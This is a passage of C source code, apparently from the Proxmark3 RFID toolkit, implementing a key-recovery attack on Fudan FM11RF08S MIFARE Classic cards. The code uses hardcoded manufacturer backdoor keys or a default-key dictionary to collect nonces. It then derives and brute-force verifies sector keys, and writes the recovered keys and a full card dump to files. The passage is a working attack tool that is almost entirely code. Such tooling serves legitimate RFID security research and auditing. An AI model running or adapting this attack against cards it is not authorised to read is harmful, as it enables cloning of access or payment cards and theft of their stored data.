            fm11_sen_candidate_progress(real_sec, key_type, MIN(idx + chunk, list->count), list->count);
            *key_out = found;
            return PM3_SUCCESS;
        }
        if (res == PM3_SUCCESS) {
            fm11_sen_clear_inplace();
            PrintAndLogEx(WARNING, "Ignoring sector %03u key %c check success without returned key material",
                          real_sec, key_type ? 'B' : 'A');
            return PM3_ESOFT;
        }
        if (res == PM3_EOPABORTED) {
            fm11_sen_clear_inplace();
            return res;
        }
        if (res == PM3_ETIMEOUT && timeout_retries++ < 2) {
            fm11_sen_clear_inplace();
            PrintAndLogEx(WARNING, "Transient timeout checking sector %03u key %c candidates, retrying chunk %u",
                          real_sec, key_type ? 'B' : 'A', (idx / KEYS_IN_BLOCK) + 1);
            fm11_sen_candidate_progress(real_sec, key_type, idx, list->count);
            continue;
        }
        if (res == PM3_ETIMEOUT) {
            fm11_sen_clear_inplace();
            PrintAndLogEx(WARNING, "Timeout checking sector %03u key %c candidates after %u retries",
                          real_sec, key_type ? 'B' : 'A', timeout_retries);
            return res;
        }
        timeout_retries = 0;
        idx += chunk;
        if (idx >= list->count || idx - last_progress >= 500) {
            fm11_sen_candidate_progress(real_sec, key_type, idx, list->count);
            last_progress = idx;
        }
    }
    fm11_sen_clear_inplace();
    return PM3_ESOFT;
}

static void fm11_print_key_table(const uint64_t keys_found[FM11RF08S_SECTORS][2],
                                 const bool found_key[FM11RF08S_SECTORS][2]) {
    char strA[26 + 1], strB[26 + 1], resA[20 + 1], resB[20 + 1];
    PrintAndLogEx(NORMAL, "");
    PrintAndLogEx(SUCCESS, "-----+-----+--------------+---+--------------+----");
    PrintAndLogEx(SUCCESS, " Sec | Blk | key A        |res| key B        |res");
    PrintAndLogEx(SUCCESS, "-----+-----+--------------+---+--------------+----");
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        uint8_t real_sec = fm11_real_sector(sec);
        if (found_key[sec][0]) {
            snprintf(strA, sizeof(strA), _GREEN_("%012" PRIX64), keys_found[sec][0]);
            snprintf(resA, sizeof(resA), _BRIGHT_GREEN_("1"));
        } else {
            snprintf(strA, sizeof(strA), _RED_("------------"));
            snprintf(resA, sizeof(resA), _RED_("0"));
        }
        if (found_key[sec][1]) {
            snprintf(strB, sizeof(strB), _GREEN_("%012" PRIX64), keys_found[sec][1]);
            snprintf(resB, sizeof(resB), _BRIGHT_GREEN_("1"));
        } else {
            snprintf(strB, sizeof(strB), _RED_("------------"));
            snprintf(resB, sizeof(resB), _RED_("0"));
        }
        char extra[16] = {0};
        if (sec >= FM11RF08S_NORMAL_SECTORS) {
            snprintf(extra, sizeof(extra), "( " _MAGENTA_("*") " )");
        }
        PrintAndLogEx(SUCCESS, " " _YELLOW_("%03u") " | %03u | %s | %s | %s | %s %s",
                      real_sec,
                      real_sec * 4 + 3,
                      strA, resA,
                      strB, resB,
                      extra);
    }
    PrintAndLogEx(SUCCESS, "-----+-----+--------------+---+--------------+----");
    PrintAndLogEx(NORMAL, "");
}

static int fm11_save_recovery_outputs(const iso14a_card_select_t *card, const iso14a_fm11rf08s_nonces_with_data_t *nonces,
                                      const uint64_t keys_found[FM11RF08S_SECTORS][2],
                                      const bool found_key[FM11RF08S_SECTORS][2],
                                      bool no_oob, bool has_data) {
    char fn[FILE_PATH_SIZE] = {0};
    snprintf(fn, sizeof(fn), "hf-mf-%s-key", sprint_hex_inrow(card->uid, card->uidlen));
    const uint64_t unknown_key = bytes_to_num(g_mifare_default_key, MIFARE_KEY_SIZE);

    uint8_t sector_count = FM11RF08S_NORMAL_SECTORS + (no_oob ? 0 : 1);
    uint8_t *keys = calloc(sector_count * 2 * MIFARE_KEY_SIZE, sizeof(uint8_t));
    if (keys == NULL) {
        return PM3_EMALLOC;
    }
    uint8_t *p = keys;
    for (uint8_t kt = 0; kt < 2; kt++) {
        for (uint8_t sec = 0; sec < sector_count; sec++) {
            uint64_t key = found_key[sec][kt] ? keys_found[sec][kt] : unknown_key;
            num_to_bytes(key, MIFARE_KEY_SIZE, p);
            p += MIFARE_KEY_SIZE;
        }
    }
    int res = saveFileEx(fn, ".bin", keys, sector_count * 2 * MIFARE_KEY_SIZE, spDump);
    free(keys);
    if (res != PM3_SUCCESS) {
        return res;
    }
    if (has_data == false) {
        PrintAndLogEx(WARNING, "Skipping dump file: nonce evidence was collected without block data");
        return PM3_SUCCESS;
    }

    uint8_t dump[MIFARE_1K_MAXBLOCK * MFBLOCK_SIZE] = {0};
    for (uint8_t blk = 0; blk < MIFARE_1K_MAXBLOCK; blk++) {
        memcpy(dump + (blk * MFBLOCK_SIZE), nonces->blocks[blk], MFBLOCK_SIZE);
    }
    for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS; sec++) {
        uint8_t trailer = sec * 4 + 3;
        uint64_t ka = found_key[sec][0] ? keys_found[sec][0] : unknown_key;
        uint64_t kb = found_key[sec][1] ? keys_found[sec][1] : unknown_key;
        num_to_bytes(ka, MIFARE_KEY_SIZE, dump + trailer * MFBLOCK_SIZE);
        num_to_bytes(kb, MIFARE_KEY_SIZE, dump + trailer * MFBLOCK_SIZE + 10);
    }
    snprintf(fn, sizeof(fn), "hf-mf-%s-dump", sprint_hex_inrow(card->uid, card->uidlen));
    return saveFileEx(fn, ".bin", dump, sizeof(dump), spDump);
}

static int fm11_select_mifare_classic(iso14a_card_select_t *card_out) {
    uint64_t tagT = GetHF14AMfU_Type();
    if (tagT != MFU_TT_UL_ERROR) {
        PrintAndLogEx(ERR, "Detected a MIFARE Ultralight/C/NTAG Compatible card.");
        PrintAndLogEx(ERR, "This command targets " _YELLOW_("MIFARE Classic"));
        return PM3_ESOFT;
    }

    clearCommandBuffer();
    SendCommandMIX(CMD_HF_ISO14443A_READER, ISO14A_CONNECT | ISO14A_CLEARTRACE | ISO14A_NO_DISCONNECT, 0, 0, NULL, 0);
    PacketResponseNG resp;
    if (WaitForResponseTimeout(CMD_ACK, &resp, 1500) == false) {
        PrintAndLogEx(DEBUG, "iso14443a card select timeout");
        DropField();
        return PM3_ETIMEOUT;
    }

    uint64_t select_status = resp.oldarg[0];
    if (select_status == 0) {
        PrintAndLogEx(FAILED, "No tag detected or other tag communication error");
        PrintAndLogEx(HINT, "Hint: Try some distance or position of the card");
        return PM3_ECARDEXCHANGE;
    }

    iso14a_card_select_t card = {0};
    memcpy(&card, (iso14a_card_select_t *)resp.data.asBytes, sizeof(iso14a_card_select_t));

    if (select_status == 2) {
        uint8_t rats[] = { 0xE0, 0x80 };
        clearCommandBuffer();
        SendCommandMIX(CMD_HF_ISO14443A_READER, ISO14A_RAW | ISO14A_APPEND_CRC | ISO14A_NO_DISCONNECT, 2, 0, rats, sizeof(rats));
        if (WaitForResponseTimeout(CMD_ACK, &resp, 2500) == false) {
            PrintAndLogEx(WARNING, "timeout while waiting for reply");
            DropField();
            return PM3_ETIMEOUT;
        }

        memcpy(card.ats, resp.data.asBytes, resp.oldarg[0]);
        card.ats_len = resp.oldarg[0];
        if (card.ats_len > 3) {
            select_status = 4;
        }
    }

    uint8_t ats_hist_pos = 0;
    if ((card.ats_len > 3) && (card.ats[0] > 1)) {
        ats_hist_pos = 2;
        ats_hist_pos += (card.ats[1] & 0x10) == 0x10;
        ats_hist_pos += (card.ats[1] & 0x20) == 0x20;
        ats_hist_pos += (card.ats[1] & 0x40) == 0x40;
    }

    version_hw_t version_hw = {0};
    int res = hf14a_getversion_data(&card, select_status, &version_hw);
    DropField();
    bool version_hw_available = (res == PM3_SUCCESS);

    int nxptype = detect_nxp_card(card.sak,
                                  ((card.atqa[1] << 8) + card.atqa[0]),
                                  select_status,
                                  card.ats_len - ats_hist_pos,
                                  card.ats + ats_hist_pos,
                                  version_hw_available,
                                  &version_hw);

    if ((nxptype & MTDESFIRE) == MTDESFIRE) {
        PrintAndLogEx(ERR, "MIFARE DESFire card detected.");
        PrintAndLogEx(ERR, "This command targets " _YELLOW_("MIFARE Classic"));
        return PM3_ESOFT;
    }
    if ((nxptype & MTULTRALIGHT) == MTULTRALIGHT) {
        PrintAndLogEx(ERR, "MIFARE Ultralight / NTAG detected.");
        PrintAndLogEx(ERR, "This command targets " _YELLOW_("MIFARE Classic"));
        return PM3_ESOFT;
    }
    if ((nxptype & MTPLUS) == MTPLUS && (nxptype & MTCLASSIC) == 0) {
        PrintAndLogEx(ERR, "MIFARE Plus card detected.");
        PrintAndLogEx(ERR, "This command targets " _YELLOW_("MIFARE Classic"));
        return PM3_ESOFT;
    }
    if ((nxptype & (MTCLASSIC | MTMINI)) == 0) {
        PrintAndLogEx(ERR, "No MIFARE Classic fingerprint detected.");
        PrintAndLogEx(ERR, "This command targets " _YELLOW_("MIFARE Classic"));
        return PM3_ESOFT;
    }

    if (card_out != NULL) {
        *card_out = card;
    }
    return PM3_SUCCESS;
}

int HFMFSENRecover(bool keep_nonces, bool no_oob, bool reader_mode, bool offline_only, int max_online_candidates, uint8_t parity_mask, bool skip_default_key_check, const sector_t *known_sectors, size_t known_sector_count) {

    iso14a_card_select_t card = {0};
    iso14a_fm11rf08s_nonces_with_data_t nonces = {0};
    const uint8_t *active_key = NULL;
    uint8_t active_key_bytes[MIFARE_KEY_SIZE] = {0};
    bool collected_with_backdoor = false;
    bool collected_with_data = false;
    fm11_keylist_t default_keys = {0};
    uint64_t t1 = msclock();

    PrintAndLogEx(INFO, "Static Encrypted Nonce Key Recovery");

    int card_res = fm11_select_mifare_classic(&card);
    if (card_res != PM3_SUCCESS) {
        return card_res;
    }

    fm11_sen_progress_header();
    for (uint8_t i = 0; i < ARRAYLEN(fm11_backdoor_keys); i++) {
        char activity[80];
        snprintf(activity, sizeof(activity), "Collect nonce/data evidence with key %s", sprint_hex_inrow(fm11_backdoor_keys[i], MIFARE_KEY_SIZE));
        fm11_sen_progress(0, activity, 0, 0);
        int res = fm11_collect_nonces(fm11_backdoor_keys[i], &card, &nonces);
        if (res == PM3_SUCCESS) {
            active_key = fm11_backdoor_keys[i];
            collected_with_backdoor = true;
            collected_with_data = true;
            break;
        }
    }
    if (active_key == NULL) {
        PrintAndLogEx(WARNING, "Unable to collect FM11RF08S nonce evidence with standard Fudan backdoor keys");
        PrintAndLogEx(INFO, "Trying default-key dictionary to find an initial normal sector key");

        int retval = fm11_load_default_keys(&default_keys);
        if (retval != PM3_SUCCESS) {
            fm11_keylist_free(&default_keys);
            return retval;
        }

        retval = fm11_collect_nonces_from_default_key_fallback(&default_keys, &card, &nonces, active_key_bytes);
        if (retval != PM3_SUCCESS) {
            DropField();
            PrintAndLogEx(WARNING, "Unable to collect FM11RF08S nonce evidence with the default-key dictionary");
            PrintAndLogEx(HINT, "Hint: provide nonce evidence with `hf mf isen --collect_fm11rf08s_without_backdoor` and a known key");
            fm11_keylist_free(&default_keys);
            return retval;
        }

        active_key = active_key_bytes;
    }

    uint32_t uid = bytes_to_num(card.uid, 4);
    uint32_t nonce_count = FM11RF08S_SECTORS * 2;
    char activity[80];
    snprintf(activity, sizeof(activity), "Loaded card UID %08X using %s key %s", uid,
             collected_with_backdoor ? "backdoor" : "dictionary",
             sprint_hex_inrow(active_key, MIFARE_KEY_SIZE));
    fm11_sen_progress(nonce_count, activity, 0, 0);
    if (keep_nonces) {
        char nonce_fn[FILE_PATH_SIZE] = {0};
        snprintf(nonce_fn, sizeof(nonce_fn), "hf-mf-%s-nonces%s", sprint_hex_inrow(card.uid, card.uidlen),
                 collected_with_data ? "_with_data" : "");
        pm3_save_fm11rf08s_nonces(nonce_fn, &nonces, collected_with_data);
        fm11_sen_progress(nonce_count, "Saved nonce/data evidence JSON", 0, 0);
    }

    uint64_t keys_found[FM11RF08S_SECTORS][2] = {{0}};
    bool found_key[FM11RF08S_SECTORS][2] = {{0}};
    uint64_t reader_keys[FM11RF08S_NORMAL_SECTORS][2] = {{0}};
    bool reader_found[FM11RF08S_NORMAL_SECTORS][2] = {{0}};
    fm11_keylist_t candidates[FM11RF08S_SECTORS][2] = {{{0}}};
    fm11_probe_queue_t probe_queue = {0};
    fm11_reuse_index_t reuse_index = {0};
    fm11_keylist_t confirmed_reuse_keys = {0};
    int retval = PM3_SUCCESS;

    uint32_t seeded_known = 0;
    size_t seed_sector_count = MIN(known_sector_count, (size_t)FM11RF08S_NORMAL_SECTORS);
    for (size_t sec = 0; sec < seed_sector_count; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (known_sectors == NULL || known_sectors[sec].foundKey[kt] == 0) {
                continue;
            }
            uint64_t known_key = known_sectors[sec].Key[kt] & 0xFFFFFFFFFFFFULL;
            keys_found[sec][kt] = known_key;
            found_key[sec][kt] = true;
            seeded_known++;
            (void)fm11_keylist_add_unique(&confirmed_reuse_keys, known_key);
        }
    }
    if (seeded_known > 0) {
        fm11_sen_progress(nonce_count, "Seed known keys from earlier autopwn stages", seeded_known, 0);
    }

    if (reader_mode) {
        retval = fm11_collect_reader_material(&card, reader_keys, reader_found);
        if (retval != PM3_SUCCESS) {
            goto out;
        }
        fm11_wait_for_enter("Reader material processed. Place the FM11RF08S card back on the antenna and press Enter to continue");
    }

    if (default_keys.count == 0) {
        retval = fm11_load_default_keys(&default_keys);
        if (retval != PM3_SUCCESS) {
            goto out;
        }
    }

    if (skip_default_key_check) {
        fm11_sen_progress(nonce_count, "Skip default-key dictionary check already done by autopwn", seeded_known, 0);
    } else {
        fm11_sen_progress(nonce_count, "Check default-key dictionary against nonce evidence", default_keys.count, 0);
        retval = fm11_check_default_keys(uid, nonce_count, &nonces, &default_keys, parity_mask, keys_found, found_key);
        if (retval != PM3_SUCCESS) {
            goto out;
        }
        for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
            for (uint8_t kt = 0; kt < 2; kt++) {
                if (found_key[sec][kt] == false) {
                    continue;
                }
                uint64_t key = keys_found[sec][kt] & 0xFFFFFFFFFFFFULL;
                if (fm11_keylist_has_key(&confirmed_reuse_keys, key)) {
                    continue;
                }
                retval = fm11_keylist_add_unique(&confirmed_reuse_keys, key);
                if (retval != PM3_SUCCESS) {
                    goto out;
                }
                uint32_t reuse_found = fm11_propagate_key_reuse_online(nonce_count, key, keys_found, found_key);
                if (reuse_found > 0) {
                    snprintf(activity, sizeof(activity), "Key re-use propagation confirmed %u additional key slots", reuse_found);
                    fm11_sen_progress(nonce_count, activity, reuse_found, 0);
                }
            }
        }
        uint32_t default_found = fm11_count_found_keys(found_key);
        if (default_found > 0) {
            snprintf(activity, sizeof(activity), "Default key check recovered %u key%s", default_found, (default_found == 1) ? "" : "s");
            fm11_sen_progress(nonce_count, activity, default_found, 0);
        }
    }

    fm11_sen_progress(nonce_count, "Generate first-pass candidates from nT/{nT}/parity", 0, 0);
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        uint8_t real_sec = fm11_real_sector(sec);
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt]) {
                continue;
            }
            uint32_t nt = fm11_bytes_to_u32(nonces.nt[sec][kt]);
            uint32_t nt_enc = fm11_bytes_to_u32(nonces.nt_enc[sec][kt]);
            int res = fm11_generate_1nt_candidates(uid, nt, nt_enc, nonces.par_err[sec][kt], parity_mask, &candidates[sec][kt]);
            if (res != PM3_SUCCESS) {
                retval = res;
                goto out;
            }
            fm11_prioritize_defaults(&candidates[sec][kt], &default_keys);
        }
        uint32_t nt_a = fm11_bytes_to_u32(nonces.nt[sec][0]);
        uint32_t nt_b = fm11_bytes_to_u32(nonces.nt[sec][1]);
        if (nt_a != nt_b && found_key[sec][0] == false && found_key[sec][1] == false) {
            int res = fm11_intersect_pair(nt_a, &candidates[sec][0], nt_b, &candidates[sec][1]);
            if (res != PM3_SUCCESS) {
                retval = res;
                goto out;
            }
            res = fm11_prioritize_by_paired_seed(&candidates[sec][0], &candidates[sec][1]);
            if (res != PM3_SUCCESS) {
                retval = res;
                goto out;
            }
            res = fm11_prioritize_by_paired_seed(&candidates[sec][1], &candidates[sec][0]);
            if (res != PM3_SUCCESS) {
                retval = res;
                goto out;
            }
            fm11_sort_candidates_by_seed_bucket(&candidates[sec][0], &candidates[sec][1]);
        }
        fm11_prioritize_defaults(&candidates[sec][0], &default_keys);
        fm11_prioritize_defaults(&candidates[sec][1], &default_keys);
        if (real_sec == 32) {
            fm11_prioritize_0000_prefix(&candidates[sec][1]);
        }
        snprintf(activity, sizeof(activity), "Prepared sec %03u candidates (A %u / B %u)",
                 real_sec, candidates[sec][0].count, candidates[sec][1].count);
        fm11_sen_progress(nonce_count, activity, candidates[sec][0].count + candidates[sec][1].count, 0);
    }

    if (reader_mode) {
        uint32_t accepted = fm11_apply_reader_material(&nonces, candidates, keys_found, found_key, reader_keys, reader_found);
        if (accepted > 0) {
            snprintf(activity, sizeof(activity), "Applied %u reader-recovered key%s", accepted, (accepted == 1) ? "" : "s");
            fm11_sen_progress(nonce_count, activity, accepted, 0);
            uint32_t reduced = 0;
            uint32_t derived = fm11_offline_fixpoint(&nonces, candidates, keys_found, found_key, &reduced, offline_only);
            if (reduced > 0) {
                snprintf(activity, sizeof(activity), "Reduced paired candidate sets by %u keys", reduced);
                fm11_sen_progress(nonce_count, activity, reduced, 0);
            }
            if (derived > 0) {
                snprintf(activity, sizeof(activity), "Derived %u paired keys from reader material", derived);
                fm11_sen_progress(nonce_count, activity, derived, 0);
            }
        }
    }
    {
    }

    uint32_t total_candidates = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        total_candidates += candidates[sec][0].count;
        total_candidates += candidates[sec][1].count;
    }
    uint32_t duplicate_candidates = 0;
    uint32_t duplicate_prefix[FM11RF08S_SECTORS][2] = {{0}};
    retval = fm11_prioritize_duplicates(candidates, duplicate_prefix, &duplicate_candidates);
    if (retval != PM3_SUCCESS) {
        goto out;
    }
    uint32_t verify_eta = (total_candidates / 2 / FM11RF08S_FCHK_KEYS_PER_SECOND) + 5;
    snprintf(activity, sizeof(activity), "Prioritized candidates (%u duplicate-priority)", duplicate_candidates);
    fm11_sen_progress(nonce_count, activity, total_candidates, verify_eta);

    retval = fm11_reuse_index_build(candidates, &reuse_index);
    if (retval != PM3_SUCCESS) {
        goto out;
    }
    snprintf(activity, sizeof(activity), "Indexed %u candidate refs for key-reuse cascades", reuse_index.ref_count);
    fm11_sen_progress(nonce_count, activity, reuse_index.ref_count, 0);

    fm11_keylist_t priority = {0};
    uint32_t reuse_eligible = 0;
    retval = fm11_build_reuse_priority_keys(&reuse_index, &priority, FM11RF08S_MAX_GLOBAL_PRIORITY_KEYS, &reuse_eligible);
    if (retval != PM3_SUCCESS) {
        fm11_keylist_free(&priority);
        goto out;
    }
    uint32_t found_before = fm11_count_found_keys(found_key);
    uint32_t priority_count = priority.count;
    if (priority_count > 0) {
        snprintf(activity, sizeof(activity), "Batch-check top %u/%u cross-sector reuse keys with fchk",
                 priority_count, reuse_eligible);
        fm11_sen_progress(nonce_count, activity, priority_count, (priority_count / FM11RF08S_FCHK_KEYS_PER_SECOND) + 2);
        retval = fm11_verify_global_priority_keys(&priority, keys_found, found_key);
        fm11_keylist_free(&priority);
        if (retval != PM3_SUCCESS) {
            goto out;
        }
        uint32_t found_after = fm11_count_found_keys(found_key);
        if (found_after > found_before) {
            snprintf(activity, sizeof(activity), "Reuse-priority fchk recovered %u normal-sector keys", found_after - found_before);
            fm11_sen_progress(nonce_count, activity, found_after - found_before, 0);
        }
    } else {
        fm11_keylist_free(&priority);
    }

    priority = (fm11_keylist_t) {0};
    retval = fm11_build_global_priority_keys(candidates, duplicate_prefix, &priority);
    if (retval != PM3_SUCCESS) {
        fm11_keylist_free(&priority);
        goto out;
    }
    found_before = fm11_count_found_keys(found_key);
    priority_count = priority.count;
    if (priority_count > 0 && priority_count <= FM11RF08S_MAX_GLOBAL_PRIORITY_KEYS) {
        snprintf(activity, sizeof(activity), "Batch-check %u duplicate-priority keys with fchk", priority_count);
        fm11_sen_progress(nonce_count, activity, priority_count, (priority_count / FM11RF08S_FCHK_KEYS_PER_SECOND) + 2);
        retval = fm11_verify_global_priority_keys(&priority, keys_found, found_key);
        fm11_keylist_free(&priority);
        if (retval != PM3_SUCCESS) {
            goto out;
        }
        uint32_t found_after = fm11_count_found_keys(found_key);
        if (found_after > found_before) {
            snprintf(activity, sizeof(activity), "Batch fchk recovered %u normal-sector keys", found_after - found_before);
            fm11_sen_progress(nonce_count, activity, found_after - found_before, 0);
        }
    } else {
        fm11_keylist_free(&priority);
        if (priority_count > FM11RF08S_MAX_GLOBAL_PRIORITY_KEYS) {
            snprintf(activity, sizeof(activity), "Skip global batch (%u keys > limit), use per-sector", priority_count);
            fm11_sen_progress(nonce_count, activity, priority_count, 0);
        }
    }
    uint32_t propagated = fm11_propagate_found_keys(&nonces, candidates, keys_found, found_key);
    if (propagated > 0) {
        snprintf(activity, sizeof(activity), "Propagated %u reused candidate key matches", propagated);
        fm11_sen_progress(nonce_count, activity, propagated, 0);
    }

    uint32_t reduced = 0;
    uint32_t derived = fm11_offline_fixpoint(&nonces, candidates, keys_found, found_key, &reduced, offline_only);
    if (reduced > 0) {
        snprintf(activity, sizeof(activity), "Reduced paired candidate sets by %u keys", reduced);
        fm11_sen_progress(nonce_count, activity, reduced, 0);
    }
    if (derived > 0) {
        snprintf(activity, sizeof(activity), "Derived %u paired keys from matching FM11RF08S seeds", derived);
        fm11_sen_progress(nonce_count, activity, derived, 0);
    }

    retval = fm11_reuse_index_build(candidates, &reuse_index);
    if (retval != PM3_SUCCESS) {
        goto out;
    }
    snprintf(activity, sizeof(activity), "Refreshed %u candidate refs for key-reuse cascades", reuse_index.ref_count);
    fm11_sen_progress(nonce_count, activity, reuse_index.ref_count, 0);

    total_candidates = fm11_count_unfound_candidates(candidates, found_key);
    if (max_online_candidates > 0 && (int)total_candidates > max_online_candidates) {
        PrintAndLogEx(WARNING, "Total unfound candidates (%u) exceeds --max-online-candidates limit (%d), stopping",
                      total_candidates, max_online_candidates);
        goto out;
    }
    if (offline_only) {
        fm11_sen_progress_footer();
        fm11_print_key_table(keys_found, found_key);
        retval = fm11_save_recovery_outputs(&card, &nonces, keys_found, found_key, no_oob, collected_with_data);
        PrintAndLogEx(SUCCESS, "time in sen " _YELLOW_("%.0f") " seconds", (float)(msclock() - t1) / 1000.0);
        goto out;
    }
    verify_eta = (total_candidates / 2 / FM11RF08S_FCHK_KEYS_PER_SECOND) + 5;
    fm11_sen_progress(nonce_count, "Measurement: score unresolved candidate paths", total_candidates, 0);
    fm11_measure_candidate_paths(&nonces, candidates, keys_found, found_key, nonce_count);
    fm11_sen_progress(nonce_count, "Verify remaining sector-specific candidates", total_candidates, verify_eta);
    /*
     * Dynamic priority verification: after every cascade, pick the list with
     * the lowest measured path cost.  Candidate lists are generated once from
     * vetted evidence; expanding them after online misses only increases work.
     */
    bool exhausted[FM11RF08S_SECTORS][2] = {{false}};
    uint32_t probe_pos = 0;
    while (true) {
        if (kbd_enter_pressed()) {
            retval = PM3_EOPABORTED;
            goto out;
        }
        /* find the cheapest unfound, non-exhausted (sec, kt) pair */
        uint8_t best_sec = 0xFF, best_kt = 0;
        uint32_t best_cost = UINT32_MAX;
        uint32_t best_count = UINT32_MAX;
        for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
            for (uint8_t kt = 0; kt < 2; kt++) {
                if (found_key[sec][kt] || exhausted[sec][kt]) {
                    continue;
                }
                uint32_t cnt = candidates[sec][kt].count;
                uint32_t cost = fm11_estimate_candidate_path_cost(&nonces, candidates, keys_found, found_key, sec, kt);
                if (sec == FM11RF08S_SECTORS - 1 && kt == 1 && cnt > 0) {
                    // Prioritize sector 32 keyB over keyA
                    if (best_sec == FM11RF08S_SECTORS - 1) {
                        cost = best_cost > 0 ? best_cost - 1 : 0;
                    }
                }
                if (cost < best_cost || (cost == best_cost && cnt < best_count)) {
                    best_cost = cost;
                    best_count = cnt;
                    best_sec = sec;
                    best_kt = kt;
                }
            }
        }
        if (best_sec == 0xFF) {
            break;  /* all sectors/keys found or exhausted */
        }
        uint8_t sec = best_sec;
        uint8_t kt  = best_kt;
        uint8_t real_sec = fm11_real_sector(sec);
        if (found_key[sec][kt ^ 1]) {
            uint32_t nt_target = fm11_bytes_to_u32(nonces.nt[sec][kt]);
            uint32_t nt_known = fm11_bytes_to_u32(nonces.nt[sec][kt ^ 1]);
            if (nt_target != nt_known) {
                uint16_t seed = fm11_compute_seednt16_nt32(nt_known, keys_found[sec][kt ^ 1]);
                uint32_t old_count = 0;
                uint32_t new_count = 0;
                int filter_res = fm11_filter_candidates_by_seed(&candidates[sec][kt], nt_target, seed, &old_count, &new_count);
                if (filter_res != PM3_SUCCESS) {
                    retval = filter_res;
                    goto out;
                }
                if (old_count > new_count) {
                    snprintf(activity, sizeof(activity), "Reduced paired candidate set by %u keys", old_count - new_count);
                    fm11_sen_progress(nonce_count, activity, old_count - new_count, 0);
                }
            } else {
                fm11_keylist_promote_existing(&candidates[sec][kt], keys_found[sec][kt ^ 1]);
            }
        }
        snprintf(activity, sizeof(activity), "sec %03u key %c - checking %u candidates", real_sec, kt ? 'B' : 'A', candidates[sec][kt].count);

        fm11_sen_progress(nonce_count, activity, candidates[sec][kt].count,
                          (candidates[sec][kt].count / 2 / FM11RF08S_FCHK_KEYS_PER_SECOND) + 1);
        uint64_t key = 0;
        int res = fm11_verify_candidates(real_sec, kt, &candidates[sec][kt], &key);
        if (res == PM3_SUCCESS) {
            propagated = fm11_accept_found_key_global(&nonces, candidates, keys_found, found_key, &reuse_index, sec, kt, key, &probe_queue);
            fm11_print_key_hit_row(nonce_count, sec, kt, key, found_key);
            uint32_t reuse_found = 0;
            if (fm11_keylist_has_key(&confirmed_reuse_keys, key) == false) {
                (void)fm11_keylist_add_unique(&confirmed_reuse_keys, key);
                reuse_found = fm11_propagate_key_reuse_online(nonce_count, key, keys_found, found_key);
            }
            if (reuse_found > 0) {
                snprintf(activity, sizeof(activity), "Key re-use propagation confirmed %u additional key slots", reuse_found);
                fm11_sen_progress(nonce_count, activity, reuse_found, 0);
                propagated += fm11_accept_found_key_global(&nonces, candidates, keys_found, found_key, &reuse_index, sec, kt, key, &probe_queue);
            }
            if (propagated > 1) {
                snprintf(activity, sizeof(activity), "Propagated %u reused candidate key matches", propagated - 1);
                fm11_sen_progress(nonce_count, activity, propagated - 1, 0);
            }
            reduced = 0;
            derived = fm11_offline_fixpoint(&nonces, candidates, keys_found, found_key, &reduced, false);
            if (reduced > 0) {
                snprintf(activity, sizeof(activity), "Reduced paired candidate sets by %u keys", reduced);
                fm11_sen_progress(nonce_count, activity, reduced, 0);
            }
            if (derived > 0) {
                snprintf(activity, sizeof(activity), "Derived %u additional paired keys", derived);
                fm11_sen_progress(nonce_count, activity, derived, 0);
            }
            while (probe_pos < probe_queue.count) {
                uint8_t ps = probe_queue.entries[probe_pos].sec;
                uint8_t pk = probe_queue.entries[probe_pos].key_type;
                uint64_t pkey = probe_queue.entries[probe_pos].key;
                probe_pos++;
                if (found_key[ps][pk]) {
                    continue;
                }
                fm11_keylist_t single = {0};
                if (fm11_keylist_push(&single, pkey, 0) == PM3_SUCCESS) {
                    uint8_t real_ps = fm11_real_sector(ps);
                    uint64_t out_key = 0;
                    if (fm11_verify_candidates(real_ps, pk, &single, &out_key) == PM3_SUCCESS) {
                        uint32_t prop = fm11_accept_found_key_global(&nonces, candidates, keys_found, found_key, &reuse_index, ps, pk, out_key, &probe_queue);
                        if (prop > 0) {
                            fm11_print_key_hit_row(nonce_count, ps, pk, out_key, found_key);
                        }
                        uint32_t reuse_extra = 0;
                        if (fm11_keylist_has_key(&confirmed_reuse_keys, out_key) == false) {
                            (void)fm11_keylist_add_unique(&confirmed_reuse_keys, out_key);
                            reuse_extra = fm11_propagate_key_reuse_online(nonce_count, out_key, keys_found, found_key);
                        }
                        if (reuse_extra > 0) {
                            snprintf(activity, sizeof(activity), "Key re-use propagation confirmed %u additional key slots", reuse_extra);
                            fm11_sen_progress(nonce_count, activity, reuse_extra, 0);
                        }
                    }
                    fm11_keylist_free(&single);
                }
            }
            total_candidates = fm11_count_unfound_candidates(candidates, found_key);
        } else if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
            retval = res;
            goto out;
        } else {
            /* candidate set exhausted without finding a key */
            exhausted[sec][kt] = true;
        }
    }

    /* drain probe queue: verify single-key probes scheduled by fm11_accept_found_key_global */
    for (uint32_t pi = probe_pos; pi < probe_queue.count; pi++) {
        uint8_t ps = probe_queue.entries[pi].sec;
        uint8_t pk = probe_queue.entries[pi].key_type;
        uint64_t pkey = probe_queue.entries[pi].key;
        if (found_key[ps][pk]) {
            continue;
        }
        fm11_keylist_t single = {0};
        if (fm11_keylist_push(&single, pkey, 0) == PM3_SUCCESS) {
            uint8_t real_ps = fm11_real_sector(ps);
            uint64_t out_key = 0;
            if (fm11_verify_candidates(real_ps, pk, &single, &out_key) == PM3_SUCCESS) {
                uint32_t prop = fm11_accept_found_key_global(&nonces, candidates, keys_found, found_key, &reuse_index, ps, pk, out_key, &probe_queue);
                if (prop > 0) {
                    fm11_print_key_hit_row(nonce_count, ps, pk, out_key, found_key);
                }
                uint32_t reuse_extra = 0;
                if (fm11_keylist_has_key(&confirmed_reuse_keys, out_key) == false) {
                    (void)fm11_keylist_add_unique(&confirmed_reuse_keys, out_key);
                    reuse_extra = fm11_propagate_key_reuse_online(nonce_count, out_key, keys_found, found_key);
                }
                if (reuse_extra > 0) {
                    snprintf(activity, sizeof(activity), "Key re-use propagation confirmed %u additional key slots", reuse_extra);
                    fm11_sen_progress(nonce_count, activity, reuse_extra, 0);
                }
            }
            fm11_keylist_free(&single);
        }
    }

    fm11_sen_progress_footer();
    fm11_print_key_table(keys_found, found_key);
